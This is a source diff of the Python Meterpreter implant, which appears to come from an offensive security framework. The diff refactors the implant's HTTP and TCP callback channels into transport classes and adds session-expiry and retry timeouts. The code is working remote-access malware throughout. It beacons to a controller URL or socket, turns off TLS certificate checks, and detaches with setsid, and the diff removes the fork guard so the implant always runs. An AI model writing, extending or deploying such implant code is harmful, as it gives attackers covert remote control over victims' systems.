@@ -1,4 +1,5 @@
 #!/usr/bin/python
+# vim: tabstop=4 softtabstop=4 shiftwidth=4 noexpandtab
 import code
 import os
 import platform
@@ -60,14 +61,16 @@ else:
 # Constants
 #
 
-# these values may be patched, DO NOT CHANGE THEM
+# these values will be patched, DO NOT CHANGE THEM
 DEBUGGING = False
-HTTP_COMMUNICATION_TIMEOUT = 300
 HTTP_CONNECTION_URL = None
-HTTP_EXPIRATION_TIMEOUT = 604800
 HTTP_PROXY = None
 HTTP_USER_AGENT = None
 PAYLOAD_UUID = ""
+SESSION_COMMUNICATION_TIMEOUT = 300
+SESSION_EXPIRATION_TIMEOUT = 604800
+SESSION_RETRY_TOTAL = 3600
+SESSION_RETRY_WAIT = 10
 
 PACKET_TYPE_REQUEST        = 0
 PACKET_TYPE_RESPONSE       = 1
@@ -393,51 +396,116 @@ class STDProcess(subprocess.Popen):
 				self.stdout_reader.read(len(channel_data))
 export(STDProcess)
 
-class PythonMeterpreter(object):
-	def __init__(self, socket=None):
+class Transport(object):
+	def __init__(self):
+		self.communication_timeout = SESSION_COMMUNICATION_TIMEOUT
+		self.communication_last = 0
+		self.communication_active = True
+		self.retry_total = SESSION_RETRY_TOTAL
+		self.retry_wait = SESSION_RETRY_WAIT
+
+	def get_packet(self):
+		self.communication_active = False
+		try:
+			pkt = self._get_packet()
+		except:
+			return None
+		self.communication_active = True
+		self.communication_last = time.time()
+		return pkt
+
+	def send_packet(self, pkt):
+		self.communication_active = False
+		try:
+			self._send_packet(pkt)
+		except:
+			return None
+		self.communication_active = True
+		self.communication_last = time.time()
+
+	def tlv_pack_timeouts(self):
+		response  = tlv_pack(TLV_TYPE_TRANS_COMM_TIMEOUT, self.communication_timeout)
+		response += tlv_pack(TLV_TYPE_TRANS_RETRY_TOTAL, self.retry_total)
+		response += tlv_pack(TLV_TYPE_TRANS_RETRY_WAIT, self.retry_wait)
+		return response
+
+class HttpTransport(Transport):
+	def __init__(self, url, proxy=None, user_agent=None):
+		super(HttpTransport, self).__init__()
+		opener_args = []
+		scheme = url.split(':', 1)[0]
+		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2,7,9)) or sys.version_info >= (3,4,3)):
+			import ssl
+			ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+			ssl_ctx.check_hostname = False
+			ssl_ctx.verify_mode = ssl.CERT_NONE
+			opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
+		if proxy:
+			opener_args.append(urllib.ProxyHandler({scheme: proxy}))
+		opener = urllib.build_opener(*opener_args)
+		if user_agent:
+			opener.addheaders = [('User-Agent', user_agent)]
+		urllib.install_opener(opener)
+		self.url = url
+		self._http_last_seen = time.time()
+		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
+
+	def _get_packet(self):
+		packet = None
+		request = urllib.Request(self.url, bytes('RECV', 'UTF-8'), self._http_request_headers)
+		url_h = urllib.urlopen(request)
+		packet = url_h.read()
+		if packet:
+			packet = packet[8:]
+		else:
+			packet = None
+		return packet
+
+	def _send_packet(self, packet):
+		request = urllib.Request(self.url, packet, self._http_request_headers)
+		url_h = urllib.urlopen(request)
+		response = url_h.read()
+
+class TcpTransport(Transport):
+	def __init__(self, socket):
+		super(TcpTransport, self).__init__()
 		self.socket = socket
-		self.driver = None
+
+	def _get_packet(self):
+		packet = None
+		if len(select.select([self.socket], [], [], 0.5)[0]):
+			packet = self.socket.recv(8)
+			if len(packet) != 8:
+				return None
+			pkt_length, pkt_type = struct.unpack('>II', packet)
+			pkt_length -= 8
+			packet = bytes()
+			while len(packet) < pkt_length:
+				packet += self.socket.recv(pkt_length - len(packet))
+		return packet
+
+	def _send_packet(self, packet):
+		self.socket.send(packet)
+
+class PythonMeterpreter(object):
+	def __init__(self, transport):
+		self.transport = transport
 		self.running = False
-		self.communications_active = True
-		self.communications_last = 0
-		if self.socket:
-			self.driver = 'tcp'
-		elif HTTP_CONNECTION_URL:
-			self.driver = 'http'
 		self.last_registered_extension = None
 		self.extension_functions = {}
 		self.channels = {}
 		self.interact_channels = []
 		self.processes = {}
-		self.transports = []
+		self.transports = [self.transport]
+		self.session_expiry_time = SESSION_EXPIRATION_TIMEOUT
+		self.session_expiry_end = time.time() + self.session_expiry_time
 		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
 			self.extension_functions[func[1:]] = getattr(self, func)
-		if self.driver:
-			if hasattr(self, 'driver_init_' + self.driver):
-				getattr(self, 'driver_init_' + self.driver)()
-			self.running = True
+		self.running = True
 
 	def debug_print(self, msg):
 		if DEBUGGING:
 			print(msg)
-
-	def driver_init_http(self):
-		opener_args = []
-		scheme = HTTP_CONNECTION_URL.split(':', 1)[0]
-		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2,7,9)) or sys.version_info >= (3,4,3)):
-			import ssl
-			ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-			ssl_ctx.check_hostname=False
-			ssl_ctx.verify_mode=ssl.CERT_NONE
-			opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
-		if HTTP_PROXY:
-			opener_args.append(urllib.ProxyHandler({scheme: HTTP_PROXY}))
-		opener = urllib.build_opener(*opener_args)
-		if HTTP_USER_AGENT:
-			opener.addheaders = [('User-Agent', HTTP_USER_AGENT)]
-		urllib.install_opener(opener)
-		self._http_last_seen = time.time()
-		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
 
 	def register_extension(self, extension_name):
 		self.last_registered_extension = extension_name
@@ -468,67 +536,19 @@ class PythonMeterpreter(object):
 		return idx
 
 	def get_packet(self):
-		packet = getattr(self, 'get_packet_' + self.driver)()
-		self.communications_last = time.time()
-		if packet:
-			self.communications_active = True
-		return packet
+		return self.transport.get_packet()
 
 	def send_packet(self, packet):
-		getattr(self, 'send_packet_' + self.driver)(packet)
-		self.communications_last = time.time()
-		self.communications_active = True
+		self.transport.send_packet(packet)
 
-	def get_packet_http(self):
-		packet = None
-		request = urllib.Request(HTTP_CONNECTION_URL, bytes('RECV', 'UTF-8'), self._http_request_headers)
-		try:
-			url_h = urllib.urlopen(request)
-			packet = url_h.read()
-		except:
-			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
-				self.running = False
-		else:
-			self._http_last_seen = time.time()
-		if packet:
-			packet = packet[8:]
-		else:
-			packet = None
-		return packet
-
-	def send_packet_http(self, packet):
-		request = urllib.Request(HTTP_CONNECTION_URL, packet, self._http_request_headers)
-		try:
-			url_h = urllib.urlopen(request)
-			response = url_h.read()
-		except:
-			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
-				self.running = False
-		else:
-			self._http_last_seen = time.time()
-
-	def get_packet_tcp(self):
-		packet = None
-		if len(select.select([self.socket], [], [], 0.5)[0]):
-			packet = self.socket.recv(8)
-			if len(packet) != 8:
-				self.running = False
-				return None
-			pkt_length, pkt_type = struct.unpack('>II', packet)
-			pkt_length -= 8
-			packet = bytes()
-			while len(packet) < pkt_length:
-				packet += self.socket.recv(pkt_length - len(packet))
-		return packet
-
-	def send_packet_tcp(self, packet):
-		self.socket.send(packet)
+	@property
+	def session_has_expired(self):
+		return time.time() > self.session_expiry_end
 
 	def run(self):
-		while self.running:
+		while self.running and not self.session_has_expired:
 			request = None
-			should_get_packet = self.communications_active or ((time.time() - self.communications_last) > 0.5)
-			self.communications_active = False
+			should_get_packet = self.transport.communication_active or ((time.time() - self.transport.communication_last) > 0.5)
 			if should_get_packet:
 				request = self.get_packet()
 			if request:
@@ -673,7 +693,22 @@ class PythonMeterpreter(object):
 		raise NotImplemented()
 
 	def _core_transport_set_timeouts(self, request, response):
-		raise NotImplemented()
+		timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_SESSION_EXP).get('value')
+		if timeout_value:
+			self.session_expiry_time = timeout_value
+			self.session_expiry_end = time.time() + self.session_expiry_time
+		timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value')
+		if timeout_value:
+			self.transport.communication_timeout = timeout_value
+		retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value')
+		if retry_value:
+			self.transport.retry_total = retry_value
+		retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value')
+		if retry_value:
+			self.transport.retry_wait = retry_value
+
+		response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
+		response += self.transport.tlv_pack_timeouts()
 
 	def _core_transport_sleep(self, request, response):
 		raise NotImplemented()
@@ -804,14 +839,16 @@ class PythonMeterpreter(object):
 		resp = struct.pack('>I', len(resp) + 4) + resp
 		return resp
 
-if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
+#if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
+if True:
 	if hasattr(os, 'setsid'):
 		try:
 			os.setsid()
 		except OSError:
 			pass
 	if HTTP_CONNECTION_URL and has_urllib:
-		met = PythonMeterpreter()
+		transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT)
 	else:
-		met = PythonMeterpreter(s)
+		transport = TcpTransport(s)
+	met = PythonMeterpreter(transport)
 	met.run()
